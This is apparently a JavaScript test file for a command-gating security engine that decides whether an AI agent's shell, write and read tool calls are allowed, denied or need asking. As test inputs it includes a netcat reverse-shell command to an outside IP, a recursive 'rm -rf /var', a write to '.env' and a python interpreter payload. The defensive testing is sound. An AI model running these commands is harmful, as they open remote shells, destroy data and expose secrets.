import test from "node:test";
import assert from "node:assert/strict";
import { SecurityEngine } from "../lib/engine.js";

test("SecurityEngine P0 stage blocks hard-deny commands and trips breaker", () => {
  const engine = new SecurityEngine();
  
  // Band 0 deny
  const d1 = engine.decide({ name: "bash", arguments: { command: "nc -e /bin/sh 1.2.3.4 9999" } });
  assert.equal(d1.verdict, "deny");
  assert.equal(d1.stage, "P0");
  assert.equal(d1.reason, "band-hard-deny");

  // inspectExecution deny (rm -rf)
  const d2 = engine.decide({ name: "bash", arguments: { command: "rm -rf /var" } });
  assert.equal(d2.verdict, "deny");
  assert.equal(d2.stage, "P0");
  assert.equal(d2.reason, "recursive-rm");

  // secret-write deny
  const d3 = engine.decide({ name: "write", arguments: { path: ".env" } });
  assert.equal(d3.verdict, "deny");
  assert.equal(d3.stage, "P0");
  assert.equal(d3.reason, "secret-write");

  // After 3 denies, circuit breaker trips
  assert.equal(engine.breaker.isTripped("default"), true);

  // Even an ordinary command now asks because breaker is tripped
  const d4 = engine.decide({ name: "bash", arguments: { command: "git status" } });
  assert.equal(d4.verdict, "ask");
  assert.equal(d4.stage, "P4");
  assert.equal(d4.reason, "circuit-breaker-tripped");
});

test("SecurityEngine P1 stage matches session grants", () => {
  const grantRegistry = {
    decide(tool, args) {
      if (tool === "bash" && args && args.command === "npm run deploy") return "allow";
      return "no-match";
    }
  };

  const engine = new SecurityEngine({ grantRegistry });
  const res = engine.decide({ name: "bash", arguments: { command: "npm run deploy" } });
  assert.equal(res.verdict, "allow");
  assert.equal(res.stage, "P1");
  assert.equal(res.reason, "session-grant");
});

test("SecurityEngine P2 stage allows safe commands and read-only tools", () => {
  const engine = new SecurityEngine();

  const r1 = engine.decide({ name: "bash", arguments: { command: "git status" } });
  assert.equal(r1.verdict, "allow");
  assert.equal(r1.stage, "P2");

  const r2 = engine.decide({ name: "read_file", arguments: { path: "src/index.js" } });
  assert.equal(r2.verdict, "allow");
  assert.equal(r2.stage, "P2");
});

test("SecurityEngine P3 stage invokes semantic classifier when provided", () => {
  let classifierCalled = false;
  const classifier = (exec) => {
    classifierCalled = true;
    if (exec.arguments.command.includes("special-check")) {
      return { verdict: "deny", reason: "custom-classifier-denial" };
    }
    return { verdict: "allow", reason: "custom-classifier-allowed" };
  };

  const engine = new SecurityEngine({ classifier });
  const res = engine.decide({ name: "bash", arguments: { command: "special-check --test" } });
  assert.equal(classifierCalled, true);
  assert.equal(res.verdict, "deny");
  assert.equal(res.stage, "P3");
  assert.equal(res.reason, "custom-classifier-denial");
});

test("SecurityEngine P4 stage asks on uncertain shell syntax", () => {
  const engine = new SecurityEngine();

  const res = engine.decide({ name: "bash", arguments: { command: "python3 -c 'import os; os.system(\"ls\")'" } });
  assert.equal(res.verdict, "ask");
  assert.equal(res.stage, "P4");
  assert.equal(res.reason, "interpreter-payload");
});

test("SecurityEngine P3 classifier error fails closed to P4 Ask", () => {
  const classifier = () => {
    throw new Error("classifier internal failure");
  };
  const engine = new SecurityEngine({ classifier });
  const res = engine.decide({ name: "bash", arguments: { command: "some-unmatched-command" } });
  assert.equal(res.verdict, "ask");
  assert.equal(res.stage, "P4");
  assert.equal(res.reason, "classifier-error");
});

test("SecurityEngine decide catches internal parser or inspection errors and fails closed", () => {
  const engine = new SecurityEngine();
  engine.bands.evaluate = () => {
    throw new Error("parser exploded");
  };
  const res = engine.decide({ name: "bash", arguments: { command: "ls" } });
  assert.equal(res.verdict, "ask");
  assert.equal(res.stage, "P4");
  assert.equal(res.reason, "inspect-error");
});

test("SecurityEngine forwards addGrant, getGrants and resume", () => {
  const engine = new SecurityEngine();
  const grant = engine.addGrant({ sessionId: "test-sess", tool: "bash", commandPrefix: "make build" });
  assert.ok(grant);
  assert.equal(grant.tool, "bash");

  const grants = engine.getGrants("test-sess");
  assert.equal(grants.length, 1);
  assert.equal(grants[0].id, grant.id);

  engine.breaker.countDeny("test-sess");
  engine.breaker.countDeny("test-sess");
  engine.breaker.countDeny("test-sess");
  assert.equal(engine.breaker.isTripped("test-sess"), true);

  engine.resume("test-sess");
  assert.equal(engine.breaker.isTripped("test-sess"), false);
});
